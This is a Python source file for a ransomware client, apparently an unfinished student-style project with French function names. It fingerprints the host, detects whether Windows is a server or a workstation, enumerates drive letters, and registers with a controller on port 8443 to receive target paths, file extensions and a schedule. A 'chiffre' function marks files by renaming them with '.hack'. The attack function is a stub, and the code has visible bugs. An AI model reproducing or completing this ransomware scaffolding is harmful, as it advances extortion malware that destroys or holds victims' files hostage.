import os
import socket
import string
from time import time
from hashlib import sha256
from platform import node, win32_edition, system
from re import search
from os import path
import utile.config as config
import utile.message as message
from utile.network import *


LAST_STATE = None

def initialize():
    global LAST_STATE

    hash_i = config.get_data_config("HASH")
    if hash_i is None:
        hash_i = hash_host_now()
        config.set_config('HASH', hash_i)
        config.save_config('configs/ransomware.json', 'configs/ransomware.key')

    os = os_type()
    if os is None:
        exit(-1)

    disks = list_disks()
    msg = message.get_message('initialize_req', [hash_i, os, disks])
    config.set_config('OS', os)
    config.set_config('DISKS', disks)
    config.save_config('configs/ransomware.json', 'configs/ransomware.key')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 8443))
    send_msg_clear(s, msg)
    msg = recv_msg_clear(s)
    msg_type = message.get_message_type(msg)

    if msg_type == 'INITIALIZE_RESP':
        send_msg_clear('Connexion closed')
        s.close()

        config.set_config('ID_DB', msg['CONFIGURE'])
        config.set_config('DISKS', msg['SETTING']['DISKS'])
        config.set_config('PATHS', msg['SETTING']['PATHS'])
        config.set_config('FILE_EXT', msg['SETTING']['FILE_EXT'])
        config.set_config('FREQ', msg['SETTING']['FREQ'])
        config.set_config('LAST_STATE', 'INITIALIZE')
        config.save_config('configs/ransomware.json', 'configs/ransomware.key')

        LAST_STATE = 'INITIALIZE'

def attaque():
    print('todo')


def chiffre(cible):
    os.rename(f'{cible}', f'{cible}.hack')
    return "Target has been encrypted"

def hash_host_now():
    identifiant = f'{node()}{time()}'
    print(identifiant)
    return sha256(bytes()).hexdigest()


def os_type():
    if search("[Ww]indows", system()):
        if search("[Ss]erver", win32_edition()):
            return "SERVER"
        else:
            return "WORKSTATION"
    return None


def list_disks():
    dl = string.ascii_uppercase
    disks = ''
    for d in dl:
        if path.exists('%s:' % d):
            if disks != '':
                disks += ','
            disks += f'{d}:'
    return disks


def main():
    return main

